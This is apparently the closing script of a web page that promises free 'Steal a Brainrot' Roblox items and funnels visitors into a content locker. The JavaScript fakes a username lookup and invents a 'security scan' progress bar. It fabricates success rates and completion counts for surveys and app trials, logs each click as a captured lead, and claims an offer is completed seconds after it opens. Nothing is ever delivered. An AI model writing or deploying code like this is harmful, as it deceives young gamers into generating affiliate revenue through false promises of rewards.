        function openLocker(username, itemName, itemImages) {
            popupOpen = true;
            stopNotifications();
            const continueBtn = document.getElementById('continue-btn');
            if (continueBtn) continueBtn.style.display = 'none';

            document.body.classList.add('no-scroll');
            document.getElementById("locker").style.display = "flex";

            document.getElementById("offersSection").style.display = "none";
            document.getElementById('progressFill').style.width = '0%';
            document.getElementById('progressPercent').textContent = '0%';
            document.getElementById('statusMessage').textContent = 'üîÑ Initializing secure items...';

            const preview = document.getElementById('gamePreviewLocker');
            preview.innerHTML = '';
            const firstImage = itemImages.length > 0 ? itemImages[0] : 'https://static.wikia.nocookie.net/stealabr/images/7/76/Childhood_gambling.png';

            document.getElementById("gamePreviewLocker").innerHTML = `
                <img src="${firstImage}" alt="Steal a Brainrot" />
                <div class="game-preview-content">
                    <h3>Steal a Brainrot - ${itemName}</h3>
                    <p class="file-info">üì¶ ${itemImages.length} Selected Items ‚Ä¢ üïí Updated: Today</p>
                    <div class="platform-badge">üë§ ${username}</div>
                </div>`;

            startOptimizedProgressBar();
        }

        function startOptimizedProgressBar(){
            let currentProgress = 0;
            let fill = document.getElementById("progressFill");
            let percent = document.getElementById("progressPercent");
            let status = document.getElementById("statusMessage");

            const messages = [
                "üîÑ Checking device compatibility...",
                "‚úÖ Scanning for security threats...",
                "üîê Verifying file integrity...",
                "‚ö° Optimizing items speed...",
                "üß† Preparing Brainrot content..."
            ];

            clearInterval(progressInterval);
            progressInterval = setInterval(() => {
                if(currentProgress >= 100){
                    clearInterval(progressInterval);
                    fill.style.width = "100%";
                    percent.textContent = "100%";
                    status.innerHTML = "‚úÖ <strong>Ready! Choose an offer to items</strong>";
                    document.getElementById("offersSection").style.display = "block";
                    loadOffers();
                } else {
                    currentProgress += 4 + Math.random() * 5;
                    if(currentProgress > 100) currentProgress = 100;
                    fill.style.width = currentProgress + "%";
                    percent.textContent = Math.round(currentProgress) + "%";
                    let msgIndex = Math.floor(currentProgress / 20);
                    if(msgIndex < messages.length) {
                        status.textContent = messages[msgIndex];
                    }
                }
            }, 120);
        }

        function loadOffers() {
            document.getElementById("offersList").innerHTML = "<p>Loading offers...</p>";
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 8000);

            fetch(`https://d3k0q5ez56odtk.cloudfront.net/public/offers/feed.php?user_id=${USER_ID}&api_key=${API_KEY}&s1=steal%20a%20brainrot`, {
                signal: controller.signal
            })
            .then(res => res.json())
            .then(offers => {
                clearTimeout(timeoutId);
                if(!offers || !Array.isArray(offers) || offers.length === 0){ showFallbackOffers(); return; }
                displayOffers(offers);
            })
            .catch(() => { clearTimeout(timeoutId); showFallbackOffers(); });
        }

        function showFallbackOffers() {
            const fallbackOffers = [
                { anchor: "Complete Quick Survey (1-2 minutes)", url: "https://example.com/survey1", type: "survey" },
                { anchor: "Watch Short Video Ad (45-60 seconds)", url: "https://example.com/video1", type: "video" },
                { anchor: "Free App Trial (2-3 minutes)", url: "https://example.com/trial1", type: "trial" },
                { anchor: "Quick Registration (1-2 minutes)", url: "https://example.com/register1", type: "registration" }
            ];
            displayOffers(fallbackOffers);
        }

        function displayOffers(offers) {
            let html = "";
            const badges = ["Recommended", "Easy", "Popular", "Quick"];

            offers.slice(0,4).forEach((offer, index) => {
                const timeOptions = [60, 90, 120, 150];
                const timeEstimate = timeOptions[index] || 120;
                const successRate = 85 + Math.floor(Math.random() * 10);
                const usersCompleted = Math.floor(Math.random() * 50000) + 20000;
                const offerType = offer.type || ['survey', 'video', 'trial', 'registration'][index];

                html += `
                <div class="offer-card" onclick="selectOffer('${offer.url}', 'Steal a Brainrot', 'web', '${offerType}', '${offer.anchor || "Quick Task"}')">
                    <div class="offer-content">
                        <div class="offer-title">${offer.anchor || "Complete Quick Task"}</div>
                        <div class="offer-details">
                            <div class="offer-detail">‚úÖ ${successRate}% Success</div>
                            <div class="offer-detail">‚è± ${Math.floor(timeEstimate/60)} min</div>
                            <div class="offer-detail">üë• ${(usersCompleted/1000).toFixed(0)}K+ completed</div>
                        </div>
                    </div>
                    <div class="offer-badge">${badges[index] || "Special"}</div>
                </div>`;
            });

            document.getElementById("offersList").innerHTML = html;
        }

        function selectOffer(url, gameName, platform, offerType, offerTitle) {
            console.log(`üéØ LEAD CAPTURED: Steal a Brainrot - ${platform} - ${offerType} - "${offerTitle}"`);
            trackAdBlueMediaConversion(gameName, platform, offerType, offerTitle);
            const trackingParams = `&subid=${USER_ID}_brainrot_web&game=Steal_a_Brainrot&platform=web&offer_type=${offerType}&source=stealabrainrot.com`;
            const trackedUrl = url + (url.includes('?') ? '&' : '?') + trackingParams;

            document.getElementById("statusMessage").innerHTML = "‚úÖ <strong>Opening offer...</strong> Complete it to items!";

            const clickSound = document.getElementById('clickSound');
            if (clickSound) { clickSound.currentTime = 0; clickSound.play(); }

            window.open(trackedUrl, '_blank');

            setTimeout(() => {
                document.getElementById("statusMessage").innerHTML = "‚úÖ <strong>Offer completed!</strong> Your items is starting...";

                setTimeout(() => {
                    alert(`üéâ items for Steal a Brainrot will start when you finish completing the offer`);
                    closeLocker();
                }, 3000);
            }, 1500);
        }

        function closeLocker(){
            document.getElementById("locker").style.display = "none";
            document.getElementById("progressFill").style.width = "0%";
            document.getElementById("progressPercent").textContent = "0%";
            document.body.classList.remove('no-scroll');
            clearInterval(progressInterval);
            popupOpen = false;
            startNotifications();

            const continueBtn = document.getElementById('continue-btn');
            if (continueBtn) {
                const selectedCount = document.querySelectorAll('.item-card.selected').length;
                continueBtn.style.display = selectedCount > 0 ? 'block' : 'none';
            }
        }

        function trackAdBlueMediaConversion(gameName, platform, offerType, offerTitle) {
            const conversionData = {
                user_id: USER_ID,
                api_key: API_KEY,
                game: gameName,
                platform: platform,
                offer_type: offerType,
                offer_title: offerTitle,
                source: 'stealabrainrot.com',
                campaign: 'brainrot_items',
                conversion_type: 'lead',
                timestamp: Date.now(),
                revenue: 0.15
            };

            fetch('https://d3k0q5ez56odtk.cloudfront.net/public/conversion/track.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(conversionData)
            }).then(response => response.json()).then(data => console.log('‚úÖ AdBlueMedia Conversion Tracked:', data)).catch(error => console.log('‚ö†Ô∏è AdBlueMedia tracking failed:', error));
        }

        // exit intent prevention
        document.getElementById('locker').addEventListener('click', function(e) {
            if (e.target === this) {
                document.getElementById("statusMessage").innerHTML = "‚ö†Ô∏è <strong>Complete an offer to get the items for free!</strong>";
            }
        });

        // purchase popup functions
        const showPurchasePopup = (itemName, itemImages) => {
            popupOpen = true;
            stopNotifications();
            document.body.classList.add('no-scroll');

            const continueBtn = document.getElementById('continue-btn');
            if (continueBtn) continueBtn.style.display = 'none';

            const popup = document.getElementById('purchase-popup');
            const popupContent = popup.querySelector('.popup-content');

            const selectedCount = itemImages.length;
            const promptText = selectedCount > 1 ? `Would you like to get these ${selectedCount} items?` : `Would you like to Get "<span>${itemName}</span>"?`;

            let imagesHTML = '<div class="selected-images-container">';
            itemImages.forEach(src => {
                imagesHTML += `<img src="${src}" alt="Selected Item" class="item-popup-image-small">`;
            });
            imagesHTML += '</div>';

            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Item(s)</h3>
        </div>
        ${imagesHTML}
        <p class="item-confirm">${promptText}</p>
        <div class="input-group">
          <input type="text" id="username-input" placeholder="Enter your Roblox username">
        </div>
        <div class="user-error d-none">Please enter a valid username</div>
        <div class="popup-buttons">
          <button class="cancel-btn">Cancel</button>
          <button class="free-btn" id="search-user-btn">
            <span class="free-icon">‚úì</span>
            <span class="free-badge">Free</span>
          </button>
        </div>
      `;
            popupContent.querySelector('.cancel-btn').addEventListener('click', () => closePurchasePopup(true));
            popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
                const clickSound = document.getElementById('clickSound');
                if (clickSound) { clickSound.currentTime = 0; clickSound.play(); }
                const username = document.getElementById('username-input').value.trim();
                if (!username) {
                    document.querySelector('.user-error').classList.remove('d-none');
                    return;
                }
                showSearchingState(username, itemName, itemImages);
            });
            popup.style.display = 'flex';
            document.getElementById('username-input').focus();
        };

        const closePurchasePopup = (restoreContinue = true) => {
            document.getElementById('purchase-popup').style.display = 'none';
            document.body.classList.remove('no-scroll');
            popupOpen = false;
            startNotifications();

            const continueBtn = document.getElementById('continue-btn');
            if (continueBtn) {
                if (!restoreContinue) {
                    continueBtn.style.display = 'none';
                } else {
                    const selectedCount = document.querySelectorAll('.item-card.selected').length;
                    continueBtn.style.display = selectedCount > 0 ? 'block' : 'none';
                }
            }
        };

        const showSearchingState = (username, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Item(s)</h3>
        </div>
        <div style="text-align:center;padding:15px">
          <div class="folding">
            <div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div>
          </div>
          <p class="searching-text">Searching for @${username}</p>
        </div>
      `;
            setTimeout(() => {
                showSuccessState(username, itemName, itemImages);
            }, 2000);
        };

        const showSuccessState = (username, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Item(s)</h3>
        </div>
        <div style="text-align:center;padding:15px">
          <p class="result-username">@${username}</p>
          <button class="get-item-now-btn">Continue</button>
        </div>
      `;
            popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
                const clickSound = document.getElementById('clickSound');
                if (clickSound) { clickSound.currentTime = 0; clickSound.play(); }

                const itemNamesArray = itemName.split(',').map(s => s.trim()).filter(Boolean);
                const itemImagesArray = itemImages.slice();

                prepareLockerDelivery(username, itemNamesArray, itemImagesArray);

                closePurchasePopup(false);

                openLocker(username, itemName, itemImages);
            });
        };

        const showErrorState = (username, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Error</h3>
        </div>
        <div style="text-align:center;padding:15px">
          <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
          <button class="get-item-now-btn" id="retry-btn">Try Again</button>
        </div>
      `;
            popupContent.querySelector('#retry-btn').addEventListener('click', function() {
                showPurchasePopup(itemName, itemImages);
            });
        };

        // ORIGINAL selection script (kept exactly)
        $(document).ready(function() {
            const dingSound = document.getElementById('dingSound');
            const MAX_SELECTIONS = 3;
            const $limitMessage = $('#selection-limit-message');

            $('.item-card').click(function() {
                const $this = $(this);
                const isSelected = $this.hasClass('selected');
                const selectedCount = $('.item-card.selected').length;

                $limitMessage.hide();

                if (isSelected) {
                    $this.removeClass('selected');
                } else {
                    if (selectedCount < MAX_SELECTIONS) {
                        $this.addClass('selected');
                        dingSound.currentTime = 0;
                        dingSound.play();
                    } else {
                        $limitMessage.show();
                        setTimeout(() => {
                            $limitMessage.fadeOut();
                        }, 2500);
                    }
                }

                if ($('.item-card.selected').length > 0) {
                    $('#continue-btn').show();
                } else {
                    $('#continue-btn').hide();
                }
            });

            $('#continue-btn').click(function() {
                const selectedItems = $('.item-card.selected');
                if (selectedItems.length === 0) return;

                const itemNames = selectedItems.map(function() {
                    return $(this).find('.item-name').text().trim();
                }).get().join(', ');

                const itemImages = selectedItems.map(function() {
                    return $(this).find('.item-img').attr('src');
                }).get();

                showPurchasePopup(itemNames, itemImages);
            });
        });

        // === SAFE HELPER: runs after load and constrains any dynamically inserted oversized avatar-like elements
        (function(){
            function constrainIfLarge(el){
                if(!el || el.classList && el.classList.contains('constrained-avatar')) return;
                try {
                    const rect = el.getBoundingClientRect();
                    const vw = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
                    const vh = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
                    if(rect.width > vw * 0.6 || rect.height > vh * 0.5 || rect.height > 420 || rect.width > 420){
                        el.classList.add('constrained-avatar');
                        el.style.maxWidth = '320px';
                        el.style.width = 'auto';
                        el.style.height = 'auto';
                        el.style.position = 'relative';
                        el.style.margin = '18px auto';
                        el.style.transform = 'none';
                    }
                } catch(e){}
            }

            function scan(){
                const selectors = 'img, iframe, canvas, .player-avatar, .game-character, .avatar-3d, .character';
                document.querySelectorAll(selectors).forEach(constrainIfLarge);
            }

            window.addEventListener('load', function(){ setTimeout(scan, 150); });

            const mo = new MutationObserver((mutations)=>{
                mutations.forEach(m=>{
                    m.addedNodes.forEach(node=>{
                        if(!(node instanceof HTMLElement)) return;
                        if(node.matches && node.matches('img, iframe, canvas, .player-avatar, .game-character, .avatar-3d, .character')) constrainIfLarge(node);
                        node.querySelectorAll && node.querySelectorAll('img, iframe, canvas, .player-avatar, .game-character, .avatar-3d, .character').forEach(constrainIfLarge);
                    });
                });
            });
            mo.observe(document.body, { childList: true, subtree: true });
            window.addEventListener('resize', function(){ setTimeout(scan, 120); });
        })();
    </script>
</body>
</html>
